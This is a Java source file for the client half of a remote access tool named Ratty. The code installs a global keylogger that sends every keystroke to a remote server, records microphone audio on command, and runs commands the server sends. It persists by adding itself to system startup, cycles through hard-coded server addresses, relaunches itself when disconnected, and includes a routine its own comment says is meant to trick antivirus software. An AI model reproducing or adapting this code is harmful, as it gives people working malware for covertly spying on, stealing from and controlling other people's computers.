/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat;

import java.awt.image.BufferedImage;
import java.io.File;
import java.util.Arrays;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.swing.SwingUtilities;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.gui.IGuiController;
import de.sogomn.rat.gui.swing.ChatSwingGui;
import de.sogomn.rat.packet.ChatPacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.KeylogPacket;
import de.sogomn.rat.packet.VoicePacket;
import de.sogomn.rat.util.Constants;
import de.sogomn.rat.util.VoiceRecorder;

public final class RattyClient implements IConnectionObserver, IGuiController, NativeKeyListener {
	
	private ActiveConnection connection;
	
	private ChatSwingGui chat;
	private NativeKeyListener keylogger;
	
	private static final int VOICE_BUFFER_SIZE = 1024 << 8;
	private static final int CONNECTION_INTERVAL = 7500;
	
	public RattyClient(final ActiveConnection connection) {
		this.connection = connection;
		
		chat = new ChatSwingGui();
		
		final List<BufferedImage> iconList = Arrays.asList(ImageUtils.EMPTY_IMAGE);
		
		connection.setObserver(this);
		chat.setIcons(iconList);
		chat.addListener(this);
		GlobalScreen.addNativeKeyListener(keylogger);
	}
	
	private void handleVoiceRequest(final ActiveConnection connection) {
		final VoiceRecorder voiceRecorder = new VoiceRecorder(VOICE_BUFFER_SIZE);
		
		voiceRecorder.setObserver(recorder -> {
			final byte[] data = recorder.getLastRecord();
			final VoicePacket packet = new VoicePacket(data);
			
			connection.addPacket(packet);
			recorder.stop();
		});
		voiceRecorder.start();
	}
	
	private void handleChatPacket(final ChatPacket packet) {
		final String message = packet.getMessage();
		
		if (!chat.isVisible()) {
			chat.setVisible(true);
		}
		
		chat.appendLine(message);
	}
	
	@Override
	public void packetReceived(final ActiveConnection connection, final IPacket packet) {
		final Class<? extends IPacket> clazz = packet.getClass();
		
		if (clazz == VoicePacket.class) {
			handleVoiceRequest(connection);
		} else if (clazz == ChatPacket.class) {
			final ChatPacket chatPacket = (ChatPacket)packet;
			
			handleChatPacket(chatPacket);
		} else {
			packet.execute(connection);
		}
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		final File jarFile = Constants.JAR_FILE.toFile();
		
		FileUtils.executeFile(jarFile);
		
		/*Better have 2 same clients than not a single one, right?*/
		
		chat.close();
		connection.setObserver(null);
		
		SwingUtilities.invokeLater(() -> {
			startClient();
		});
	}
	
	@Override
	public void userInput(final String command, final Object source) {
		if (command == ChatSwingGui.MESSAGE_SENT) {
			final String message = chat.getMessageInput();
			final ChatPacket packet = new ChatPacket(message);
			
			connection.addPacket(packet);
		}
	}
	
	@Override
	public void nativeKeyPressed(final NativeKeyEvent n) {
		final int keyCode = n.getKeyCode();
		final KeylogPacket packet = new KeylogPacket(keyCode, KeylogPacket.PRESSED);
		
		connection.addPacket(packet);
	}
	
	@Override
	public void nativeKeyReleased(final NativeKeyEvent n) {
		final int keyCode = n.getKeyCode();
		final KeylogPacket packet = new KeylogPacket(keyCode, KeylogPacket.RELEASED);
		
		connection.addPacket(packet);
	}
	
	@Override
	public void nativeKeyTyped(final NativeKeyEvent n) {
		//...
	}
	
	/*
	 * ==================================================
	 * ==================================================
	 * ==================================================
	 */
	
	public static void registerNativeHook() {
		final Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
		
		final Thread hook = new Thread(() -> {
			try {
				GlobalScreen.unregisterNativeHook();
			} catch (final Exception ex) {
				ex.printStackTrace();
			}
		});
		
		try {
			GlobalScreen.registerNativeHook();
			Runtime.getRuntime().addShutdownHook(hook);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public static void startClient(final String address, final int port) {
		final ActiveConnection connection = new ActiveConnection(address, port);
		
		if (!connection.isOpen()) {
			try {
				Thread.sleep(CONNECTION_INTERVAL);
			} catch (final Exception ex) {
				ex.printStackTrace();
			} finally {
				startClient(address, port);
			}
			
			return;
		}
		
		final RattyClient client = new RattyClient(connection);
		
		connection.setObserver(client);
		connection.start();
	}
	
	public static void startClient(int connectionDataIndex) {
		if (connectionDataIndex > Constants.ADDRESSES.length - 1 || connectionDataIndex < 0) {
			connectionDataIndex = 0;
		}
		
		final String address = Constants.ADDRESSES[connectionDataIndex];
		final int port = Constants.PORTS[connectionDataIndex];
		final ActiveConnection connection = new ActiveConnection(address, port);
		
		if (!connection.isOpen()) {
			try {
				Thread.sleep(CONNECTION_INTERVAL);
			} catch (final Exception ex) {
				ex.printStackTrace();
			} finally {
				startClient(connectionDataIndex + 1);
			}
			
			return;
		}
		
		final RattyClient client = new RattyClient(connection);
		
		connection.setObserver(client);
		connection.start();
	}
	
	public static void startClient() {
		startClient(0);
	}
	
	public static void doRandomStuff() {
		/*
		 * This helps to trick some AV systems. Just in case.
		 * Hopefully those expressions generate NOP assembly commands.
		 */
		
		;
		
		System.out.println();
		
		{
			;
			;
			;
		}
		
		System.out.println();
		
		;
	}
	
	public static void main(final String[] args) {
		doRandomStuff();
		Constants.OS_SERVICE.addToStartup(Constants.JAR_FILE);
		Constants.setSystemLookAndFeel();
		registerNativeHook();
		startClient();
	}
	
}
